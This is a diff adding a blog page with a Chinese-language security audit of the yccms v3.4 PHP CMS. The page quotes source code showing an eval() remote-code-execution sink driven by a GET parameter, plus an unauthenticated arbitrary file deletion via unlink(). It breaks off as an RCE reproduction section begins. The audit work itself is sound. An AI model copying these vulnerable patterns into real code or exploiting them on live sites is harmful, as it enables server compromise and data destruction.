@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/xvsf/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=xvsf/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>yccms v3.4 代码审计 | xvsf</title>
+<meta name="keywords" content="PHP 代码审计">
+<meta name="description" content="yccms v3.4 代码审计">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/xvsf/posts_backup/yccms-v3.4-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+<link crossorigin="anonymous" href="/xvsf/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css" integrity="sha256-2jIR5e&#43;Ge/K3X9WmUVz&#43;1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/xvsf/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/xvsf/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/xvsf/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/xvsf/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/xvsf/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/xvsf/posts_backup/yccms-v3.4-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/xvsf/" accesskey="h" title="xvsf (Alt + H)">xvsf</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      yccms v3.4 代码审计
+    </h1>
+    <div class="post-description">
+      yccms v3.4 代码审计
+    </div>
+    <div class="post-meta"><span title='2025-07-12 09:00:00 +0000 UTC'>July 12, 2025</span>&nbsp;·&nbsp;<span>4 min</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="yccms-v34-代码审计">yccms v3.4 代码审计<a hidden class="anchor" aria-hidden="true" href="#yccms-v34-代码审计">#</a></h1>
+<p>程序版本：</p>
+<p><img alt="20250708090010810" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948854.png"></p>
+<p>从这个目录结构注意到这是一个MVC模式</p>
+<p><img alt="20250708135815537" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948086.png"></p>
+<h2 id="通读代码">通读代码<a hidden class="anchor" aria-hidden="true" href="#通读代码">#</a></h2>
+<h3 id="admin">admin<a hidden class="anchor" aria-hidden="true" href="#admin">#</a></h3>
+<h4 id="indexphp">index.php<a hidden class="anchor" aria-hidden="true" href="#indexphp">#</a></h4>
+<p>后台入口</p>
+<p>require  引入文件  /config/run.inc.php 完成网站的初始化</p>
+<p>路由：GET   /admin?a=</p>
+<h3 id="ceshi1ceshi2compile">ceshi1&amp;ceshi2&amp;compile<a hidden class="anchor" aria-hidden="true" href="#ceshi1ceshi2compile">#</a></h3>
+<p>都是一些页面模板</p>
+<h3 id="config">config<a hidden class="anchor" aria-hidden="true" href="#config">#</a></h3>
+<h4 id="configincphp">config.inc.php<a hidden class="anchor" aria-hidden="true" href="#configincphp">#</a></h4>
+<p>数据库、Smarty以及其他的系统配置</p>
+<h4 id="countphp">count.php<a hidden class="anchor" aria-hidden="true" href="#countphp">#</a></h4>
+<p>通过计算根目录，加载 run.inc.php文件</p>
+<h4 id="runincphp">run.inc.php<a hidden class="anchor" aria-hidden="true" href="#runincphp">#</a></h4>
+<p>初始化文件、入口文件（进入后台会调用）</p>
+<p>功能：</p>
+<ul>
+<li>
+<p>开启session，设置编码和时区</p>
+</li>
+<li>
+<p>引入配置文件和模板：<code>config/config.inc.php</code></p>
+<p>​	<code>/public/smarty/Smarty.class.php</code></p>
+</li>
+<li>
+<p>自动加载类：<code>__autoload()方法用于自动加载类</code></p>
+<p>​				    Action的类加载controller</p>
+<p>​					Model的类加载model</p>
+<p>​					其他的类加载public/class/</p>
+</li>
+<li>
+<p>单入口：<code>Factory::setAction()-&gt;run();</code>调用控制器的run()，</p>
+</li>
+</ul>
+<p>安全问题：入口文件的Factory给下面的RCE提供了入口点</p>
+<p>配置文件会有漏洞吗？配置文件会不会泄露数据库信息？</p>
+<h3 id="contrller">contrller<a hidden class="anchor" aria-hidden="true" href="#contrller">#</a></h3>
+<h4 id="actionclassphp">Action.class.php<a hidden class="anchor" aria-hidden="true" href="#actionclassphp">#</a></h4>
+<p>所有控制器的父类</p>
+<p>功能：</p>
+<ul>
+<li>定义属性</li>
+<li>构造函数</li>
+<li>分页、静态分页功能</li>
+<li>控制器运行入口</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//控制器基类
+</span></span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Action</span> <span class="p">{</span><span class="c1">//声明Action类，属于所有控制器的父类
+</span></span></span><span class="line"><span class="cl">	<span class="k">protected</span> <span class="nv">$_tpl</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span><span class="c1">//定义属性
+</span></span></span><span class="line"><span class="cl">	<span class="k">protected</span> <span class="nv">$_model</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>	
+</span></span><span class="line"><span class="cl">	<span class="k">protected</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span><span class="c1">//__construct() 构造函数，就是当对象被创建时，类中被自动调用的第一个函数，并且一个类中只能存在一个构造函数。但这里是protected，就不能在类的外部直接new这个类，只能在子类中通过继承使用。
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_tpl</span> <span class="o">=</span> <span class="nx">TPL</span><span class="o">::</span><span class="na">getInstance</span><span class="p">();</span><span class="c1">//模板渲染
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_model</span> <span class="o">=</span> <span class="nx">Factory</span><span class="o">::</span><span class="na">setModel</span><span class="p">();</span><span class="c1">//创建模型对象
+</span></span></span><span class="line"><span class="cl">		<span class="nx">Tool</span><span class="o">::</span><span class="na">setRequest</span><span class="p">();</span> <span class="c1">//表单转义和html过滤	可以防XSS、SQL
+</span></span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">protected</span> <span class="k">function</span> <span class="nf">page</span><span class="p">(</span><span class="nv">$_total</span><span class="p">,</span><span class="nv">$_pagesize</span> <span class="o">=</span> <span class="nx">PAGE_SIZE</span><span class="p">,</span> <span class="nv">$_model</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span><span class="c1">//定义了一个分页函数
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_model</span> <span class="o">=</span> <span class="nx">Validate</span><span class="o">::</span><span class="na">isNullString</span><span class="p">(</span><span class="nv">$_model</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_model</span> <span class="o">:</span> <span class="nv">$_model</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$_page</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Page</span><span class="p">(</span><span class="nv">$_total</span><span class="p">,</span><span class="nv">$_pagesize</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_model</span><span class="o">-&gt;</span><span class="na">setLimit</span><span class="p">(</span><span class="nv">$_page</span><span class="o">-&gt;</span><span class="na">getLimit</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_tpl</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="s1">&#39;page&#39;</span><span class="p">,</span><span class="nv">$_page</span><span class="o">-&gt;</span><span class="na">showpage</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_tpl</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="s1">&#39;num&#39;</span><span class="p">,(</span><span class="nv">$_page</span><span class="o">-&gt;</span><span class="na">getPage</span><span class="p">()</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="nv">$_pagesize</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//静态专用
+</span></span></span><span class="line"><span class="cl">	<span class="k">protected</span> <span class="k">function</span> <span class="nf">page2</span><span class="p">(</span><span class="nv">$_total</span><span class="p">,</span><span class="nv">$_pagesize</span> <span class="o">=</span> <span class="nx">PAGE_SIZE</span><span class="p">,</span> <span class="nv">$_model</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span><span class="nv">$_url2</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$_fx</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span><span class="c1">//另一种分页
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_model</span> <span class="o">=</span> <span class="nv">$_model</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$_page</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Page</span><span class="p">(</span><span class="nv">$_total</span><span class="p">,</span><span class="nv">$_pagesize</span><span class="p">,</span><span class="nv">$_url2</span><span class="p">,</span><span class="nv">$_fx</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_model</span><span class="o">-&gt;</span><span class="na">setLimit</span><span class="p">(</span><span class="nv">$_page</span><span class="o">-&gt;</span><span class="na">getLimit</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_tpl</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="s1">&#39;page&#39;</span><span class="p">,</span><span class="nv">$_page</span><span class="o">-&gt;</span><span class="na">listpage</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_tpl</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="s1">&#39;num&#39;</span><span class="p">,(</span><span class="nv">$_page</span><span class="o">-&gt;</span><span class="na">getPage</span><span class="p">()</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="nv">$_pagesize</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="nf">run</span><span class="p">()</span> <span class="p">{</span><span class="c1">//控制器运行入口
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$_m</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;m&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;m&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;index&#39;</span><span class="p">;</span><span class="c1">//url传参&#39;?m=&#39;,默认为index
+</span></span></span><span class="line"><span class="cl">		<span class="nx">method_exists</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$_m</span><span class="p">)</span> <span class="o">?</span> <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;$this-&gt;&#39;</span><span class="o">.</span><span class="nv">$_m</span><span class="o">.</span><span class="s1">&#39;();&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">index</span><span class="p">();</span><span class="c1">//eval() 可以执行任意字符串形式的 PHP 代码，此处通过搜索发现 run()函数 出现在 config/run.inc.php 这个文件，存在rce
+</span></span></span><span class="line"><span class="cl"> 	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><h4 id="adminactionclassphp">AdminAction.class.php<a hidden class="anchor" aria-hidden="true" href="#adminactionclassphp">#</a></h4>
+<p>管理员控制器</p>
+<p>功能：</p>
+<ul>
+<li>
+<p>加载后台首页</p>
+</li>
+<li>
+<p>更改密码：使用sha1加密不安全</p>
+</li>
+<li>
+<p>系统信息显示：</p>
+<p>系统信息页：</p>
+<p><img alt="20250711132213642" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080949129.png"></p>
+</li>
+<li>
+<p>退出时清理缓存：删除 compile 目录文件</p>
+</li>
+</ul>
+<p>路由：?a=admin&amp;m=update -&gt; 调用 update()</p>
+<h4 id="articleactionclassphp">ArticleAction.class.php<a hidden class="anchor" aria-hidden="true" href="#articleactionclassphp">#</a></h4>
+<p>文章控制器，</p>
+<p>功能：显示文章列表</p>
+<p>​			提供搜索功能</p>
+<p>​			增删修改文章</p>
+<p>​			nav、attr（文章的修饰属性）等功能</p>
+<h4 id="callactionclassphp">CallAction.class.php<a hidden class="anchor" aria-hidden="true" href="#callactionclassphp">#</a></h4>
+<p>功能： 验证码生成</p>
+<p>​		后台文件上传</p>
+<p>​		编辑器上传</p>
+<h4 id="htmlactionclassphp">HtmlAction.class.php<a hidden class="anchor" aria-hidden="true" href="#htmlactionclassphp">#</a></h4>
+<p>生成静态控制器</p>
+<blockquote>
+<p><strong>生成静态页面：</strong></p>
+<p>首先调用模型，取出数据库内容，之后通过模板引擎渲染页面，输出HTML页面，然后使用工具类<code>Tool::HtmlFile($filename, $content)</code>，把HTML内容保存到指定路径，就可以在前端页面查看了。</p>
+<p><strong>静态页面作用：</strong></p>
+<ul>
+<li>直接访问<code>.html</code>文件，不需要调动数据库查询；</li>
+<li>页面生成后不再执行动态代码，防止SQL注入；</li>
+<li>当然，这种把内容提前准备好的方式，对于提升性能、减少算力、节约服务器资源、服务器更稳定等等有一定的优势。</li>
+</ul>
+</blockquote>
+<p>本网站后台修改文章内容后需要<strong>静态生成</strong>，之后方可在首页显示。</p>
+<p>功能： 生成首页</p>
+<p>​			生成文章</p>
+<p>​			栏目列表</p>
+<p>​			模板渲染</p>
+<p>​			静态化输出</p>
+<p>​			分步处理</p>
+<p><img alt="20250711154124943" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080949148.png"></p>
+<h4 id="linkactionclassphp">LinkAction.class.php<a hidden class="anchor" aria-hidden="true" href="#linkactionclassphp">#</a></h4>
+<p>链接控制器</p>
+<p>功能：后台管理友情链接，修改链接、排序功能</p>
+<h4 id="loginactionclassphp">LoginAction.class.php<a hidden class="anchor" aria-hidden="true" href="#loginactionclassphp">#</a></h4>
+<p>登录控制器</p>
+<p>功能：登录验证：sha1加密密码</p>
+<p>​			验证码</p>
+<p>​			记住密码</p>
+<p>​			AJAX 验证</p>
+<h4 id="navactionclassphp">NavAction.class.php<a hidden class="anchor" aria-hidden="true" href="#navactionclassphp">#</a></h4>
+<p>分类控制器</p>
+<p>功能：查看、排序、增删修改分类列表</p>
+<h4 id="picactionclassphp">PicAction.class.php<a hidden class="anchor" aria-hidden="true" href="#picactionclassphp">#</a></h4>
+<p>图片控制器</p>
+<p>功能：</p>
+<ul>
+<li>
+<p>后台图片展示：读取根目录中的uploads文件夹，但是没有过滤文件非法后缀，此处可能上传 .php 文件</p>
+</li>
+<li>
+<p>删除：没有检验图片路径，存在任意文件删除漏洞</p>
+</li>
+<li>
+<p>这里并没有进行用户权限的判断，非管理员（未登录）用户也可访问到图片列表并删除</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//图片控制器
+</span></span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">PicAction</span> <span class="k">extends</span> <span class="nx">Action</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="k">parent</span><span class="o">::</span><span class="na">__construct</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//这里并没有进行用户权限的判断，非管理员（未登录）用户也可访问到图片列表并删除
+</span></span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$_dirPath</span><span class="o">=</span><span class="nx">opendir</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;/uploads//&#39;</span><span class="p">);</span><span class="c1">//打开 /uploads/ 目录
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$_dirName</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="c1">//保存图片名
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$_picArr</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="k">while</span><span class="p">(</span><span class="o">!!</span><span class="nv">$_dirName</span><span class="o">=</span><span class="nx">readdir</span><span class="p">(</span><span class="nv">$_dirPath</span><span class="p">)){</span><span class="c1">//遍历 uploads 下的文件，此处无过滤
+</span></span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="nv">$_dirName</span><span class="o">!=</span><span class="s1">&#39;.&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$_dirName</span><span class="o">!=</span><span class="s1">&#39;..&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$_picArr</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$_dirName</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">krsort</span><span class="p">(</span><span class="nv">$_picArr</span><span class="p">);</span><span class="c1">//逆序排列
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_tpl</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="s1">&#39;picNum&#39;</span><span class="p">,</span><span class="nx">count</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;/uploads//&#39;</span><span class="p">))</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span><span class="c1">//获取上传的文件数
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_tpl</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="s1">&#39;picArr&#39;</span><span class="p">,</span><span class="nv">$_picArr</span><span class="p">);</span><span class="c1">//显示上传文件
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_tpl</span><span class="o">-&gt;</span><span class="na">display</span><span class="p">(</span><span class="s1">&#39;admin/public/picshow.tpl&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="nf">delall</span><span class="p">(){</span><span class="c1">//删除图片，依旧没有验证用户
+</span></span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;send&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="nx">validate</span><span class="o">::</span><span class="na">isNullString</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pid&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">tool</span><span class="o">::</span><span class="na">layer_alert</span><span class="p">(</span><span class="s1">&#39;没有选择任何图片!&#39;</span><span class="p">,</span><span class="s1">&#39;?a=pic&#39;</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span><span class="c1">//是否选择图片，若为空，layer_alert 弹窗提示7并跳回 &#39;?a=pic&#39;
+</span></span></span><span class="line"><span class="cl">			<span class="nv">$_fileDir</span><span class="o">=</span><span class="nx">ROOT_PATH</span><span class="o">.</span><span class="s1">&#39;/uploads/&#39;</span><span class="p">;</span><span class="c1">//上传目录的跟路径
+</span></span></span><span class="line"><span class="cl">			<span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pid&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$_value</span><span class="p">){</span><span class="c1">//遍历提交的图片名
+</span></span></span><span class="line"><span class="cl">				<span class="nv">$_filePath</span><span class="o">=</span><span class="nv">$_fileDir</span><span class="o">.</span><span class="nv">$_value</span><span class="p">;</span><span class="c1">//构造文件路径，这里的路径可以拼接，且 $_value 是可控的，造成漏洞
+</span></span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$_filePath</span><span class="p">)){</span><span class="c1">//unlink() 删除文件
+</span></span></span><span class="line"><span class="cl">					<span class="nx">tool</span><span class="o">::</span><span class="na">layer_alert</span><span class="p">(</span><span class="s1">&#39;图片删除失败,请设权限为777!&#39;</span><span class="p">,</span><span class="s1">&#39;?a=pic&#39;</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location:?a=pic&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>			
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>	
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><h4 id="searchactionclassphp">SearchAction.class.php<a hidden class="anchor" aria-hidden="true" href="#searchactionclassphp">#</a></h4>
+<p>搜索控制器</p>
+<p>功能：用于前端页面的内容搜索</p>
+<h4 id="systemactionclassphp">SystemAction.class.php<a hidden class="anchor" aria-hidden="true" href="#systemactionclassphp">#</a></h4>
+<p>系统设置控制器</p>
+<p>功能：后台系统信息、设置首页文字内容</p>
+<h2 id="记一些知识点函数">记一些知识点、函数<a hidden class="anchor" aria-hidden="true" href="#记一些知识点函数">#</a></h2>
+<p><a href="https://www.cnblogs.com/phpper/p/8976304.html">PHP 中 private、public、protected区别</a></p>
+<p><a href="https://jueee.github.io/2020/10/2020-10-20-PHP%E4%B9%8BSmarty%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%BD%BF%E7%94%A8%E6%B1%87%E6%80%BB/">PHP 之 Smarty 模板引擎使用汇总</a></p>
+<p>Smarty 是 PHP 的一个引擎模板，可以将 MVC 中的 C 分离出来。</p>
+<p><a href="https://blog.csdn.net/weixin_50602266/article/details/121910781">JavaScript之Ajax</a></p>
+<blockquote>
+<p>AJAX (Asynchronous JavaScript and XML) 异步 JS 和 XML，在不刷新整个页面的情况下，与服务器交换数据的技术。</p>
+</blockquote>
+<h3 id="htmlspecialchars">htmlspecialchars()<a hidden class="anchor" aria-hidden="true" href="#htmlspecialchars">#</a></h3>
+<blockquote>
+<p><code>htmlspecialchars()</code> 函数把预定义的字符转换为 HTML 实体。</p>
+<p>预定义的字符是：</p>
+<ul>
+<li>&amp; （和号）成为 &amp;</li>
+<li>&quot; （双引号）成为 &quot;</li>
+<li>&rsquo; （单引号）成为 '</li>
+<li>&lt; （小于）成为 &lt;</li>
+<li>&gt; （大于）成为 &gt;</li>
+</ul>
+</blockquote>
+<h2 id="历史漏洞">历史漏洞<a hidden class="anchor" aria-hidden="true" href="#历史漏洞">#</a></h2>
+<p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-47137">YCCMS存在文件上传漏洞（CNVD-2021-47137）</a></p>
+<p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-46794">YCCMS存在文件上传漏洞（CNVD-2021-46794）</a></p>
+<p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-46795">YCCMS存在逻辑缺陷漏洞</a></p>
+<h3 id="rce漏洞复现">RCE漏洞复现<a hidden class="anchor" aria-hidden="true" href="#rce漏洞复现">#</a></h3>
+<p>根据Action.class.php审计，发现<code>method_exists($this, $_m) ? eval('$this-&gt;'.$_m.'();') : $this-&gt;index();</code></p>
+<p>eval() 可以执行任意字符串形式的 PHP 代码，此处通过搜索发现 run()函数 出现在 config/run.inc.php 这个文件，存在rce</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="c1">//	config/run.inc.php  
+</span></span></span><span class="line"><span class="cl"><span class="nx">Factory</span><span class="o">::</span><span class="na">setAction</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">run</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="na">setAction</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//	public/class/Factory.class.php
+</span></span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Factory</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">public</span> <span class="k">function</span> <span class="nf">setAction</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$_a</span><span class="o">=</span><span class="nx">self</span><span class="o">::</span><span class="na">getA</span><span class="p">();</span><span class="c1">//$_a 是get传参，可控变量
